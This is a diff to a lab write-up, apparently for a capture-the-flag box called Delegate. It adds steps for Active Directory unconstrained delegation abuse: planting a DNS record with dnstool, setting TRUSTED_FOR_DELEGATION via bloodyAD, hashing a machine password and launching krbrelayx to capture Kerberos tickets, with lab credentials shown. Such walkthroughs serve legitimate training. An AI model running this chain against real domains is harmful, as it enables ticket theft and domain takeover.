@@ -383,7 +383,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set                    
 The `SeEnableDelegationPrivilege` is enabled. This privilege in Windows allows a service account to delegate credentials from a client to other services in a domain.
 
 
-# Delegation Abuse
+# Delegation abuse
 
 <br />
 
@@ -411,7 +411,7 @@ MAQ         10.129.34.106   389    DC1              MachineAccountQuota: 10
 
 <br />
 
-## Host Setup
+## Host setup
 
 <br />
 
@@ -435,7 +435,7 @@ Then, we add this DNS record:
 <br />
 
 ```bash
-❯ python3 dnstool.py -u 'delegate.vl\theredp4nther$' -p 'Red123!' --action add --record oxdf.delegate.vl --data 10.10.14.235 --type A -dns-ip 10.129.34.106 dc1.delegate.vl
+❯ python3 dnstool.py -u 'delegate.vl\theredp4nther$' -p 'Red123!' --action add --record theredp4nther.delegate.vl --data 10.10.14.235 --type A -dns-ip 10.129.34.106 dc1.delegate.vl
 [-] Connecting to host...
 [-] Binding to host
 [+] Bind OK
@@ -467,6 +467,41 @@ It worked. Finally, we set the unconstrained delegation to the host:
 ```bash
 ❯ bloodyAD -d delegate.vl -u N.Thompson -p KALEB_2341 --host dc1.delegate.vl add uac 'theredp4nther$' -f TRUSTED_FOR_DELEGATION
 [+] ['TRUSTED_FOR_DELEGATION'] property flags added to theredp4nther$'s userAccountControl
+```
+
+<br />
+
+## Capture authentication
+
+<br />
+
+The authentication will be capture with `krbrealyx` impacket tool. However, to use it, we need to obtain before the NTLM hash of the computer password:
+
+```bash
+❯ python -c "password = 'theredp4nther'; import hashlib; print(hashlib.new('md4', password.encode('utf-16le')).hexdigest())"
+4fea147a5c9c6a101ac85f05b3d14cdb
+```
+
+<br />
+
+Now, we can start it:
+
+<br />
+
+```bash
+❯ python3 krbrelayx.py -hashes 4fea147a5c9c6a101ac85f05b3d14cdb
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client SMB loaded..
+[*] Running in export mode (all tickets will be saved to disk). Works with unconstrained delegation attack only.
+[*] Running in unconstrained delegation abuse mode using the specified credentials.
+[*] Setting up SMB Server
+[*] Setting up HTTP Server on port 80
+
+[*] Setting up DNS Server
+[*] Servers started, waiting for connections
 ```
 
 <br />
